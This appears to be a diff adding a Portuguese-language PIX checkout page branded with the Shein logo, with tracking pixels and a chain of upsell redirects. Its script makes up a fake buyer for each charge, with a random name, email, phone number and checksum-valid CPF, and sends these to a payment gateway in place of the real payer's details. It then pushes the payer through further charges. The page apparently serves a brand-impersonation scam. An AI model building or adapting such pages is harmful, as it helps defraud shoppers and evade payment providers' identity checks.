@@ -1,0 +1,494 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pagamento via PIX</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+    <link href="css/all.min.css" rel="stylesheet" />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+    <link rel="stylesheet" href="css/css.css" />
+
+    <style>
+        .payment-status {
+            margin-top: 20px;
+            padding: 15px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            border-left: 4px solid #007bff;
+        }
+
+        .status-content {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .status-icon {
+            font-size: 24px;
+            color: #007bff;
+        }
+
+        .status-text {
+            flex: 1;
+        }
+
+        .status-title {
+            margin: 0;
+            font-weight: 600;
+            color: #333;
+            font-size: 16px;
+        }
+
+        .status-subtitle {
+            margin: 5px 0 0 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .payment-status .fa-check-circle {
+            color: #28a745;
+        }
+    </style>
+
+    <!-- TikTok Pixel Code Start -->
+    <script>
+    !(function (w, d, t) {
+      w.TiktokAnalyticsObject = t;
+      var ttq = (w[t] = w[t] || []);
+      (ttq.methods = [
+        "page",
+        "track",
+        "identify",
+        "instances",
+        "debug",
+        "on",
+        "off",
+        "once",
+        "ready",
+        "alias",
+        "group",
+        "enableCookie",
+        "disableCookie",
+        "holdConsent",
+        "revokeConsent",
+        "grantConsent",
+      ]),
+        (ttq.setAndDefer = function (t, e) {
+          t[e] = function () {
+            t.push([e].concat(Array.prototype.slice.call(arguments, 0)));
+          };
+        });
+      for (var i = 0; i < ttq.methods.length; i++)
+        ttq.setAndDefer(ttq, ttq.methods[i]);
+      (ttq.instance = function (t) {
+        for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)
+          ttq.setAndDefer(e, ttq.methods[n]);
+        return e;
+      }),
+        (ttq.load = function (e, n) {
+          var r = "https://analytics.tiktok.com/i18n/pixel/events.js",
+            o = n && n.partner;
+          (ttq._i = ttq._i || {}),
+            (ttq._i[e] = []),
+            (ttq._i[e]._u = r),
+            (ttq._t = ttq._t || {}),
+            (ttq._t[e] = +new Date()),
+            (ttq._o = ttq._o || {}),
+            (ttq._o[e] = n || {});
+          n = document.createElement("script");
+          (n.type = "text/javascript"),
+            (n.async = !0),
+            (n.src = r + "?sdkid=" + e + "&lib=" + t);
+          e = document.getElementsByTagName("script")[0];
+          e.parentNode.insertBefore(n, e);
+        });
+      ttq.load("D4L24BRC77UEBGID2NJ0");
+      ttq.ready(function() {
+        ttq.enableCookie();
+        ttq.page();
+      });
+    })(window, document, "ttq");
+    </script>
+    <!-- TikTok Pixel Code End -->
+
+    <script src="js/utm-handler.js" data-token="b7ec7500-4668-4253-9d5e-6c7c43d5d4d0"
+        data-click-id-param="click_id"></script>
+</head>
+
+<body>
+    <header>
+        <div class="container" style="padding:0">
+            <img src="images/shein-logo.png" alt="Logo Pagamento PIX" class="logo" />
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="payment-container">
+            <div class="security-badge">
+                <i class="fas fa-lock"></i>
+                <span>Ambiente Seguro</span>
+            </div>
+
+            <div id="loading" class="loading">
+                <div class="spinner"></div>
+                <p>Gerando QRCode para pagamento...</p>
+            </div>
+
+            <div id="payment-content" style="display: none">
+                <div class="qrcode-container">
+                    <h2 class="section-title">
+                        <i class="fas fa-mobile-alt"></i>
+                        Escaneie o QRCode abaixo
+                    </h2>
+                    <div id="qrcode"></div>
+                    <img id="qrcode-img" style="display: none" alt="QR Code PIX" />
+                </div>
+
+                <div class="copy-section">
+                    <h2 class="section-title">
+                        <i class="far fa-copy"></i>
+                        Ou copie o código PIX
+                    </h2>
+                    <div class="input-group">
+                        <input type="text" id="pix-code" readonly="" />
+                        <button class="copy-btn" id="copy-btn">
+                            <i class="far fa-copy"></i>
+                            <span>Copiar</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="payment-info">
+                    <div class="info-item">
+                        <span class="info-label">
+                            <i class="fas fa-money-bill-wave"></i>
+                            Valor:
+                        </span>
+                        <span id="amount">R$ --,--</span>
+                    </div>
+                    <div class="info-item">
+                        <span class="info-label">
+                            <i class="far fa-clock"></i>
+                            Válido até:
+                        </span>
+                        <span id="expiration">--/--/---- --:--</span>
+                    </div>
+                </div>
+
+                <div class="trust-badges">
+                    <div class="trust-badge">
+                        <i class="fas fa-shield-alt text-success"></i>
+                        <span>Pagamento Seguro</span>
+                    </div>
+                    <div class="trust-badge">
+                        <i class="fas fa-bolt"></i>
+                        <span>Transação Instantânea</span>
+                    </div>
+                    <div class="trust-badge">
+                        <i class="fas fa-headset"></i>
+                        <span>Suporte 24/7</span>
+                    </div>
+                </div>
+
+                <!-- Indicador de verificação de pagamento -->
+                <div id="payment-status" class="payment-status" style="display: none">
+                    <div class="status-content">
+                        <div class="status-icon">
+                            <i class="fas fa-spinner fa-spin"></i>
+                        </div>
+                        <div class="status-text">
+                            <p class="status-title">
+                                Aguardando confirmação do pagamento...
+                            </p>
+                            <p class="status-subtitle" id="status-subtitle">
+                                Verificando a cada 5 segundos
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div id="error-message" class="error-message" style="display: none"></div>
+        </div>
+    </div>
+
+    <script>
+        // --- Lógica portada do PHP ---
+        const primeirosNomes = [
+            "Ana", "João", "Maria", "Carlos", "Lucas", "Sofia", "Pedro", "Fernanda", "Eduardo",
+            "Isabela", "Gustavo", "Beatriz", "Ricardo", "Patrícia", "Roberto", "Juliana",
+            "Felipe", "Larissa", "Thiago", "Julio", "Cláudia", "Vitor", "Bruna", "Renato", "Vanessa"
+        ];
+        const sobrenomes = [
+            "Silva", "Santos", "Oliveira", "Costa", "Pereira", "Almeida", "Martins", "Rodrigues",
+            "Melo", "Dias", "Souza", "Nascimento", "Barbosa", "Araujo", "Cavalcanti", "Campos",
+            "Pinto", "Lima", "Carvalho", "Gomes", "Ferreira", "Ribeiro", "Castro", "Mendes",
+            "Azevedo", "Fernandes", "Morais", "Vieira", "Faria", "Pimentel"
+        ];
+        const terceirosNomes = [
+            "Lima", "Gomes", "Ribeiro", "Ferreira", "Mendes", "Azevedo", "Carvalho", "Fernandes",
+            "Figueiredo", "Moura", "Rocha", "Teixeira", "Silveira", "Lopes", "Santana", "Pereira",
+            "Alves", "Sá", "Castro", "Machado", "Fontes", "Mello", "Pimentel", "Tavares", "Barreto",
+            "Assis", "Leal", "Cunha", "Rezende", "Borges"
+        ];
+
+        function getRandom(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
+        }
+
+        const primeiroNome = getRandom(primeirosNomes);
+        const sobrenome = getRandom(sobrenomes);
+        let terceiroNome;
+        do {
+            terceiroNome = getRandom(terceirosNomes);
+        } while (terceiroNome === sobrenome);
+
+        const nomeCompleto = `${primeiroNome} ${sobrenome} ${terceiroNome}`;
+
+        // Gerar Email
+        const nomeFormatado = nomeCompleto.toLowerCase().replace(/\s+/g, '').normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+        const dia = String(Math.floor(Math.random() * 31) + 1).padStart(2, '0');
+        const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
+        const emailDomains = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com", "@icloud.com"];
+        const dominio = getRandom(emailDomains);
+        const email = `${nomeFormatado}${dia}${mes}${dominio}`;
+
+        // Gerar CPF
+        function gerarCPF() {
+            const rnd = (n) => Math.round(Math.random() * n);
+            const mod = (dividendo, divisor) => Math.round(dividendo - (Math.floor(dividendo / divisor) * divisor));
+            const n = Array(9).fill(0).map(() => rnd(9));
+
+            let d1 = n.reduce((total, num, i) => total + (num * (10 - i)), 0);
+            d1 = 11 - mod(d1, 11);
+            if (d1 >= 10) d1 = 0;
+
+            let d2 = n.reduce((total, num, i) => total + (num * (11 - i)), 0) + (d1 * 2);
+            d2 = 11 - mod(d2, 11);
+            if (d2 >= 10) d2 = 0;
+
+            return `${n.join('')}${d1}${d2}`;
+        }
+        const cpf = gerarCPF();
+
+        // Gerar Telefone
+        const ddd = Math.floor(Math.random() * (99 - 11 + 1)) + 11;
+        const comDigito9 = Math.random() < 0.5;
+        const numero = Math.floor(Math.random() * 90000000) + 10000000; // 8 digitos
+        const telefone = comDigito9 ? `${ddd}9${numero}` : `${ddd}${numero}`;
+
+        // --- Configuração de Upsell e Valor (Portado de nlo-config.php) ---
+        const urlParams = new URLSearchParams(window.location.search);
+        const upParam = urlParams.get('up');
+        let upsellUrl = "../up1";
+        let valor = 21.67;
+
+        if (upParam) {
+            switch (upParam) {
+                case "1": upsellUrl = "../up2"; valor = 20.64; break;
+                case "2": upsellUrl = "../up3"; valor = 27.90; break;
+                case "3": upsellUrl = "../up4"; valor = 21.56; break;
+                case "4": upsellUrl = "../up5"; valor = 22.30; break;
+                case "5": upsellUrl = "../up6"; valor = 43.94; break;
+                case "6": upsellUrl = "../up2"; valor = 17.50; break;
+                default: upsellUrl = "../up1"; valor = 21.67;
+            }
+        }
+
+        // Atualiza UI com valor
+        const valorExibicao = valor.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
+        document.getElementById('amount').textContent = valorExibicao;
+
+        // --- Lógica de Checkout ---
+        let id_transacao = "";
+
+        function gerarPix() {
+            // Prepara params
+            const params = new URLSearchParams(window.location.search);
+            params.delete("valor");
+            params.delete("up");
+            const utmString = params.toString() || "utm_source=direct";
+
+            // URL da API Serverless
+            const apiUrl = new URL("/api/gateway", window.location.origin);
+            apiUrl.searchParams.set("acao", "criar");
+            apiUrl.searchParams.set("nome", nomeCompleto);
+            apiUrl.searchParams.set("email", email);
+            apiUrl.searchParams.set("cpf", cpf);
+            apiUrl.searchParams.set("telefone", telefone);
+            apiUrl.searchParams.set("valor", valor.toFixed(2)); // Envia como string formatada
+            apiUrl.searchParams.set("utm", utmString);
+            if (upParam) apiUrl.searchParams.set("up", upParam);
+
+            console.log("🌐 Chamando API:", apiUrl.toString());
+
+            fetch(apiUrl)
+                .then((response) => {
+                    if (!response.ok) {
+                        return response.json().then((err) => {
+                            throw new Error(err.erroMsg || `HTTP ${response.status}`);
+                        });
+                    }
+                    return response.json();
+                })
+                .then((data) => {
+                    console.log("✅ Resposta da API:", data);
+
+                    if (data.erro) {
+                        showError(data.erroMsg || "Erro ao gerar o PIX. Tente novamente...");
+                    } else if (data.pixCode && data.payment_id) {
+                        handlePixSuccess(data);
+                    } else {
+                        showError("Erro ao gerar o PIX. Resposta inválida.");
+                    }
+                })
+                .catch((error) => {
+                    console.error("❌ Erro ao chamar API:", error);
+                    showError("Erro ao gerar o PIX: " + error.message);
+                });
+        }
+
+        function handlePixSuccess(data) {
+            id_transacao = data.payment_id;
+            const pixCode = data.pixCode;
+
+            // Pixel Facebook
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'InitiateCheckout', {
+                    value: valor,
+                    currency: 'BRL',
+                    num_items: 1
+                });
+            }
+
+            document.getElementById("loading").style.display = "none";
+            document.getElementById("payment-content").style.display = "block";
+
+            // Expiração
+            const expirationDate = new Date(Date.now() + 2 * 24 * 60 * 60 * 1000);
+            const formattedDate = expirationDate.toLocaleString("pt-BR", {
+                day: "2-digit", month: "2-digit", year: "numeric", hour: "2-digit", minute: "2-digit"
+            });
+            document.getElementById("expiration").textContent = formattedDate;
+
+            // QR Code
+            document.getElementById("pix-code").value = pixCode;
+            if (pixCode) {
+                const qrcodeElement = document.getElementById("qrcode");
+                qrcodeElement.innerHTML = "";
+                new QRCode(qrcodeElement, {
+                    text: pixCode,
+                    width: 240,
+                    height: 240,
+                    correctLevel: QRCode.CorrectLevel.L
+                });
+            }
+
+            // Botão Copiar
+            const copyBtn = document.getElementById("copy-btn");
+            const newCopyBtn = copyBtn.cloneNode(true);
+            copyBtn.parentNode.replaceChild(newCopyBtn, copyBtn);
+            newCopyBtn.addEventListener("click", function () {
+                const pixCodeInput = document.getElementById("pix-code");
+                pixCodeInput.select();
+                pixCodeInput.setSelectionRange(0, 99999);
+
+                if (navigator.clipboard && window.isSecureContext) {
+                    navigator.clipboard.writeText(pixCodeInput.value).then(() => {
+                        newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+                        setTimeout(() => newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>', 2000);
+                    });
+                } else {
+                    document.execCommand("copy");
+                    newCopyBtn.innerHTML = '<i class="fas fa-check"></i> <span>Copiado!</span>';
+                    setTimeout(() => newCopyBtn.innerHTML = '<i class="far fa-copy"></i> <span>Copiar</span>', 2000);
+                }
+            });
+
+            if (id_transacao) {
+                iniciarVerificacaoPagamento(id_transacao);
+            }
+        }
+
+        function iniciarVerificacaoPagamento(payment_id) {
+            const statusElement = document.getElementById("payment-status");
+            if (statusElement) statusElement.style.display = "block";
+
+            function checkPaymentStatus() {
+                const apiUrl = new URL("/api/gateway", window.location.origin);
+                apiUrl.searchParams.set("acao", "verificar");
+                apiUrl.searchParams.set("payment_id", payment_id);
+
+                return fetch(apiUrl)
+                    .then(res => res.json())
+                    .then(data => {
+                        const status = data?.status?.toLowerCase();
+                        return (status === "approved" || status === "completed");
+                    })
+                    .catch(err => false);
+            }
+
+            let checkPaymentInterval = setInterval(() => {
+                checkPaymentStatus().then((paid) => {
+                    if (paid) {
+                        clearInterval(checkPaymentInterval);
+                        handlePaymentConfirmed(payment_id);
+                    }
+                });
+            }, 5000);
+        }
+
+        function handlePaymentConfirmed(payment_id) {
+            if (typeof fbq !== 'undefined') {
+                fbq('track', 'Purchase', {
+                    currency: 'BRL',
+                    value: valor,
+                    transaction_id: payment_id
+                });
+            }
+
+            const statusElement = document.getElementById("payment-status");
+            if (statusElement) {
+                statusElement.innerHTML = `
+          <div class="status-content">
+            <div class="status-icon" style="color: #28a745;"><i class="fas fa-check-circle"></i></div>
+            <div class="status-text">
+              <p class="status-title" style="color: #28a745;">Pagamento confirmado!</p>
+              <p class="status-subtitle">Redirecionando...</p>
+            </div>
+          </div>
+        `;
+            }
+
+            // Redirecionamento com UTMs
+            const upsell = new URL(upsellUrl, window.location.href); // upsellUrl é relativo, resolve com base atual
+            const currentParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of currentParams.entries()) {
+                if (!upsell.searchParams.has(key)) {
+                    upsell.searchParams.set(key, value);
+                }
+            }
+            upsell.searchParams.delete("up");
+
+            setTimeout(() => {
+                window.location.href = upsell.toString();
+            }, 2500);
+        }
+
+        function showError(message) {
+            document.getElementById("loading").style.display = "none";
+            const errorElement = document.getElementById("error-message");
+            errorElement.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
+            errorElement.style.display = "block";
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            gerarPix();
+        });
+    </script>
+</body>
+
+</html>
